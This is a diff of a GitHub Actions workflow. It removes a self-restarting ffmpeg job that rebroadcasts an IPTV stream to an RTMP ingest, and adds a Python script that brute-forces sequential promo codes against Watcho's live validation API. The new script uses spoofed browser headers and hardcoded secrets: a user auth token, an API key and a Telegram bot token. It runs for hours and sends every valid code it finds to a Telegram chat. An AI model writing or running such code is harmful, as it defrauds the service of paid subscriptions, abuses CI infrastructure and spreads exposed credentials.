@@ -1,64 +1,155 @@
-name: "6-Hour HLS to RTMP Stream (Auto Restart)"
+name: Watcho Promo Checker
 
 on:
-  schedule:
-      - cron: "55 */5 * * *" 
-  workflow_dispatch:  # Manual trigger
-  push:               # Auto trigger when commit happens
-    branches:
-      - main
+  workflow_dispatch:  # run manually from Actions tab
 
 jobs:
-  stream:
+  check-promos:
     runs-on: ubuntu-latest
-    timeout-minutes: 360  # 6 hours
+
     steps:
-      - name: Checkout Repository
-        uses: actions/checkout@v4
+      - name: Install requests
+        run: pip install requests
 
-      - name: Install Dependencies
+      - name: Run promo checker
         run: |
-          sudo apt update && sudo apt install ffmpeg python3 wget git -y
-          wget -O logo.png "https://i.ibb.co/sdHxr15r/CURSED-STREAM-1.png"
+          python3 - << 'PYEOF'
+          import requests
+          import json
+          import time
 
-      - name: Start Stream
-        run: |
-          python3 - <<'EOF'
-          import subprocess, time
+          # ── Config ──────────────────────────────────────────────────────────
 
-          STREAM_INPUT = "http://iptvpro.stream:80/play/live.php?mac=00:1A:79:CC:C1:AB&stream=282674&extension=m3u8&play_token="
-          RTMP_OUTPUT = "rtmp://ovsu.okcdn.ru/input/1081439512_1081439512_43_lcoq56a4be"
+          MOBILE_NO         = "7856810284"
+          OTTSMSID          = 68676566
+          PAYMENT_GATEWAY   = ""
+          SUBSCRIPTION_PLAN = "PL735B90B4568125ED6C3F678819B6E058"
+          AUTH_TOKEN        = (
+              "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
+              "eyJ1bmlxdWVfbmFtZSI6Ijc4NTY4MTAyODQiLCJuYmYiOjE3NzgyMjkwNDEsImV4cCI6"
+              "MTg2NDYyOTA0MSwiaWF0IjoxNzc4MjI5MDQxLCJpc3MiOiJEaXNoT1RUIiwiYXVkIjoiRGlzaE9UVCJ9."
+              "BhR5uY7wWlqnWOsLO8MO8nhbYrjGsRtHVQbVCI0_PqE"
+          )
 
-          def start_stream():
-            return subprocess.Popen([
-                "ffmpeg", "-re",
-                "-i", STREAM_INPUT,
-                "-i", "logo.png",
-                "-filter_complex", "overlay=10:10",
-                "-vcodec", "libx264",
-                "-vprofile", "baseline",
-                "-g", "30",
-                "-acodec", "aac",
-                "-strict", "-2",
-                "-f", "flv",
-                RTMP_OUTPUT
-            ])
+          START_CODE = "W4MM12764583"
 
+          # ── Telegram ─────────────────────────────────────────────────────────
 
-          process = start_stream()
-          while True:
-              time.sleep(30)
-              if process.poll() is not None:
-                  print("Stream stopped! Restarting FFmpeg...")
-                  process = start_stream()
-          EOF
+          TG_BOT_TOKEN = "8629736889:AAHZsgovnwDeDpG0Yu8BML5V9o9aQMYGOwY"
+          TG_CHAT_ID   = "8024677797"
 
-      - name: Auto-restart (commit to trigger again)
-        run: |
-          git config --global user.name "github-actions"
-          git config --global user.email "github-actions@github.com"
-          echo "Restarted: $(date)" > last_run.txt
-          git add last_run.txt
-          git commit -m "Auto-restart stream $(date)" || echo "No changes to commit"
-          git push
-          
+          def send_telegram(text: str):
+              url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
+              try:
+                  requests.post(url, json={"chat_id": TG_CHAT_ID, "text": text}, timeout=10)
+              except Exception as e:
+                  print(f"[TG ERROR] {e}")
+
+          # ── Watcho API ───────────────────────────────────────────────────────
+
+          WATCHO_URL = "https://planofferapi.watcho.com/api/PlanOffer/VaildatePromoCode"
+
+          HEADERS = {
+              "accept": "application/json, text/plain, */*",
+              "accept-language": "en-US,en;q=0.9,en-IN;q=0.8",
+              "apikey": "dIsH19Tv0724",
+              "content-type": "application/json",
+              "origin": "https://plan-offers.watcho.com",
+              "priority": "u=1, i",
+              "referer": "https://plan-offers.watcho.com/",
+              "sec-ch-ua": '"Microsoft Edge";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
+              "sec-ch-ua-mobile": "?0",
+              "sec-ch-ua-platform": '"Windows"',
+              "sec-fetch-dest": "empty",
+              "sec-fetch-mode": "cors",
+              "sec-fetch-site": "same-site",
+              "user-agent": (
+                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                  "AppleWebKit/537.36 (KHTML, like Gecko) "
+                  "Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0"
+              ),
+          }
+
+          def split_code(code):
+              i = len(code) - 1
+              while i >= 0 and code[i].isdigit():
+                  i -= 1
+              return code[:i + 1], int(code[i + 1:])
+
+          def check_promo(promo_code):
+              payload = {
+                  "MobileNo": MOBILE_NO,
+                  "OTTSMSID": OTTSMSID,
+                  "PromoCode": promo_code,
+                  "PaymentGateway": PAYMENT_GATEWAY,
+                  "SubscriptionPlanCode": SUBSCRIPTION_PLAN,
+                  "AuthToken": AUTH_TOKEN,
+              }
+              try:
+                  resp = requests.post(WATCHO_URL, headers=HEADERS, json=payload, timeout=15)
+                  resp.raise_for_status()
+                  return resp.json()
+              except requests.RequestException as e:
+                  print(f"[ERROR] {e}")
+                  return None
+
+          # ── Main ─────────────────────────────────────────────────────────────
+
+          prefix, number = split_code(START_CODE)
+          found = []
+
+          # GitHub Actions jobs have a 6-hour limit; run for up to 5.5 hours
+          deadline = time.time() + 5.5 * 3600
+
+          print(f"Starting from {START_CODE}\n")
+          print(f"{'CODE':<20} {'STATUS':<10} MESSAGE")
+          print("─" * 70)
+
+          while time.time() < deadline:
+              promo_code = f"{prefix}{number}"
+              print(f"{promo_code:<20}", end=" ", flush=True)
+
+              data = check_promo(promo_code)
+
+              if data is None:
+                  print(f"{'ERROR':<10} retrying in 3s...")
+                  time.sleep(3)
+                  continue
+
+              status  = data.get("ResultStatus", "Unknown").strip()
+              message = data.get("ResultMessage", "no message")
+
+              if status.lower() == "success":
+                  print(f"{'SUCCESS':<10} {message}")
+
+                  result     = data.get("Result", {})
+                  discount   = result.get("DiscountType", {})
+                  validity   = result.get("SubscriptionValidityInDays", "?")
+                  vendor     = result.get("VendorID", "?")
+
+                  tg_msg = (
+                      f"✅ Valid Watcho Promo Code Found!\n\n"
+                      f"Code      : {promo_code}\n"
+                      f"Vendor    : {vendor}\n"
+                      f"Discount  : {discount.get('Value', '?')}% {discount.get('Type', '')}\n"
+                      f"Validity  : {validity} days\n\n"
+                      f"Message   : {message}"
+                  )
+                  send_telegram(tg_msg)
+                  print(f"{'':20} └─ Telegram notification sent")
+                  found.append(promo_code)
+              else:
+                  print(f"{status:<10} {message}")
+
+              number += 1
+
+          # ── Final summary via Telegram ────────────────────────────────────────
+
+          if found:
+              summary = f"🏁 Run complete.\n\nValid codes found ({len(found)}):\n" + "\n".join(found)
+          else:
+              summary = "🏁 Run complete. No valid promo codes found."
+
+          send_telegram(summary)
+          print("\n" + summary)
+          PYEOF
